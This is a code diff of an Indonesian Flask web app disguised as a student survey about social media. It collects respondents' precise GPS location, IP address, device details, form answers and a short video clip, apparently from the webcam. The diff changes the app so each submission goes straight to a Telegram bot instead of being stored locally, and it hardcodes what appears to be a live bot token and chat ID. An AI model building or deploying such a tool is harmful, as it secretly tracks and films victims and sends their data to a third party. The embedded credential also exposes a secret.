@@ -1,4 +1,4 @@
-from flask import Flask, render_template_string, request, jsonify, send_from_directory
+from flask import Flask, render_template_string, request, jsonify
 import datetime
 import os
 import base64
@@ -10,15 +10,12 @@ app = Flask(__name__)
 # ============================================
 # KONFIGURASI
 # ============================================
-UPLOAD_FOLDER = "uploads"
-os.makedirs(UPLOAD_FOLDER, exist_ok=True)
-app.config["MAX_CONTENT_LENGTH"] = 50 * 1024 * 1024
 
 # ============================================
 # KONFIGURASI TELEGRAM
 # ============================================
-TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "GANTI_TOKEN")
-TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "GANTI_CHAT_ID")
+TELEGRAM_TOKEN = os.environ.get("TELEGRAM_TOKEN", "8647021039:AAHOwTmysMiq81h3vF-o04T3T-oHUU5tU-g")
+TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "6600650184")
 
 # ============================================
 # KONFIGURASI SURVEI (UBAH SESUAI TUGAS)
@@ -36,85 +33,6 @@ INFO_SURVEI = {
 # ============================================
 # FUNGSI: KIRIM KE TELEGRAM
 # ============================================
-def kirim_ke_telegram(nama_video, lat, lon, akurasi, ip, waktu, ua, form_data):
-    if not TELEGRAM_TOKEN or "GANTI" in TELEGRAM_TOKEN:
-        print("⚠ Telegram belum dikonfigurasi")
-        return False
-
-    try:
-        # Format data siswa
-        siswa_text = "\n\n👤 *Data Siswa:*\n"
-        label_map = {
-            "nama": "Nama",
-            "kelas": "Kelas",
-            "umur": "Umur",
-            "jk": "Jenis Kelamin",
-            "medsos": "Medsos Favorit",
-            "durasi": "Durasi Harian",
-            "waktu": "Waktu Akses",
-            "dampak": "Dampak",
-            "pendapat": "Pendapat"
-        }
-        for k, v in form_data.items():
-            label = label_map.get(k, k)
-            siswa_text += f"• {label}: `{v}`\n"
-
-        caption = (
-            f"🎥 *Video + Lokasi Baru Masuk!*\n\n"
-            f"📍 *Lokasi:*\n"
-            f"Lat: `{lat:.6f}`\n"
-            f"Lon: `{lon:.6f}`\n"
-            f"Akurasi: ±{round(akurasi)} meter\n\n"
-            f"🗺 [Buka di Google Maps](https://www.google.com/maps?q={lat},{lon})\n\n"
-            f"🌐 *IP:* `{ip}`\n"
-            f"⏰ *Waktu:* {waktu}\n"
-            f"📱 *Device:* {ua[:60]}"
-            f"{siswa_text}"
-        )
-
-        path_video = os.path.join(UPLOAD_FOLDER, nama_video)
-
-        if nama_video == "-" or not os.path.exists(path_video):
-            requests.post(
-                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
-                data={
-                    "chat_id": TELEGRAM_CHAT_ID,
-                    "text": caption + "\n\n⚠ Video tidak tersedia",
-                    "parse_mode": "Markdown"
-                },
-                timeout=10
-            )
-            return True
-
-        with open(path_video, "rb") as vid:
-            files = {"video": (nama_video, vid, "video/webm")}
-            data = {
-                "chat_id": TELEGRAM_CHAT_ID,
-                "caption": caption,
-                "parse_mode": "Markdown",
-                "supports_streaming": True,
-                "width": 640,
-                "height": 480,
-                "duration": 5
-            }
-            r = requests.post(
-                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendVideo",
-                data=data,
-                files=files,
-                timeout=60
-            )
-
-        if r.status_code == 200:
-            print(f"✅ Notifikasi Telegram terkirim")
-            return True
-        else:
-            print(f"❌ Telegram error: {r.text[:200]}")
-            return False
-
-    except Exception as e:
-        print(f"❌ Gagal kirim ke Telegram: {e}")
-        return False
-
 
 # ============================================
 # HALAMAN SURVEI
@@ -722,57 +640,93 @@ def simpan():
     ip = request.headers.get("X-Forwarded-For", request.remote_addr).split(",")[0].strip()
     ua = request.headers.get("User-Agent", "unknown")[:80]
     waktu = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-    waktu_file = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
     ref = uuid.uuid4().hex[:12].upper()
 
     ext = "webm" if "webm" in mime else ("mp4" if "mp4" in mime else "webm")
 
-    nama_video = "-"
-    if video_data.startswith("data:video"):
-        try:
+    # ============================================
+    # KIRIM LANGSUNG KE TELEGRAM (TANPA SIMPAN FILE)
+    # ============================================
+    if not TELEGRAM_TOKEN or "GANTI" in TELEGRAM_TOKEN:
+        print("⚠ Telegram belum dikonfigurasi")
+        return jsonify({"status": "ok", "waktu": waktu, "ref": ref})
+
+    try:
+        # Format data survei untuk caption
+        label_map = {
+            "nama": "Nama",
+            "kelas": "Kelas",
+            "umur": "Umur",
+            "jk": "Jenis Kelamin",
+            "medsos": "Medsos Favorit",
+            "durasi": "Durasi Harian",
+            "waktu": "Waktu Akses",
+            "dampak": "Dampak/Pendapat",
+            "pendapat": "Pendapat"
+        }
+        siswa_text = "\n\n👤 *Data Siswa:*\n"
+        for k, v in form_data.items():
+            label = label_map.get(k, k)
+            siswa_text += f"• {label}: `{v}`\n"
+
+        caption = (
+            f"🎥 *Video + Lokasi Baru Masuk!*\n\n"
+            f"📍 *Lokasi:*\n"
+            f"Lat: `{lat:.6f}`\n"
+            f"Lon: `{lon:.6f}`\n"
+            f"Akurasi: ±{round(akurasi)} meter\n\n"
+            f"🗺 [Buka di Google Maps](https://www.google.com/maps?q={lat},{lon})\n\n"
+            f"🌐 *IP:* `{ip}`\n"
+            f"⏰ *Waktu:* {waktu}\n"
+            f"📱 *Device:* {ua[:60]}"
+            f"{siswa_text}"
+        )
+
+        # Kalau video ada → kirim video + caption
+        if video_data.startswith("data:video"):
             header, encoded = video_data.split(",", 1)
             vid_bytes = base64.b64decode(encoded)
-            nama_video = f"video_{waktu_file}_{uuid.uuid4().hex[:6]}.{ext}"
-            path_video = os.path.join(UPLOAD_FOLDER, nama_video)
-            with open(path_video, "wb") as f:
-                f.write(vid_bytes)
-        except Exception as e:
-            print("Gagal simpan video:", e)
 
-    with open("log_lokasi.txt", "a", encoding="utf-8") as f:
-        f.write(f"\n{'='*60}\n")
-        f.write(f"[{waktu}] REF: {ref}\n")
-        f.write(f"IP: {ip}\n")
-        f.write(f"Lokasi: {lat}, {lon} (±{round(akurasi)}m)\n")
-        f.write(f"Video: {nama_video}\n")
-        f.write(f"UA: {ua}\n")
-        f.write(f"Form Data:\n")
-        for k, v in form_data.items():
-            f.write(f"  - {k}: {v}\n")
+            files = {"video": (f"video.{ext}", vid_bytes, mime)}
+            r = requests.post(
+                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendVideo",
+                data={
+                    "chat_id": TELEGRAM_CHAT_ID,
+                    "caption": caption,
+                    "parse_mode": "Markdown",
+                    "supports_streaming": True,
+                    "width": 640,
+                    "height": 480,
+                    "duration": 5
+                },
+                files=files,
+                timeout=60
+            )
+        else:
+            # Kalau tidak ada video → kirim pesan teks saja
+            r = requests.post(
+                f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage",
+                data={
+                    "chat_id": TELEGRAM_CHAT_ID,
+                    "text": caption + "\n\n⚠ Video tidak tersedia",
+                    "parse_mode": "Markdown"
+                },
+                timeout=30
+            )
 
-    print(f"📍🎥 Data diterima: {lat}, {lon} | REF: {ref}")
+        if r.status_code == 200:
+            print(f"✅ Notifikasi Telegram terkirim | REF: {ref}")
+        else:
+            print(f"❌ Telegram error: {r.status_code} - {r.text[:200]}")
 
-    kirim_ke_telegram(nama_video, lat, lon, akurasi, ip, waktu, ua, form_data)
+    except Exception as e:
+        print(f"❌ Gagal kirim ke Telegram: {e}")
 
-    return jsonify({"status": "ok", "waktu": waktu, "video": nama_video, "ref": ref})
-
+    return jsonify({"status": "ok", "waktu": waktu, "ref": ref})
 
 # ============================================
 # HELPER ROUTES
 # ============================================
-@app.route("/video/<filename>")
-def video(filename):
-    return send_from_directory(UPLOAD_FOLDER, filename)
-
-
-@app.route("/lihat_log")
-def lihat_log():
-    if not os.path.exists("log_lokasi.txt"):
-        return "Belum ada log."
-    with open("log_lokasi.txt", "r", encoding="utf-8") as f:
-        isi = f.read()
-    return f"<pre style='padding:20px;font-size:13px;background:#f8f9fa'>{isi}</pre>"
-
 
 @app.route("/test_telegram")
 def test_telegram():
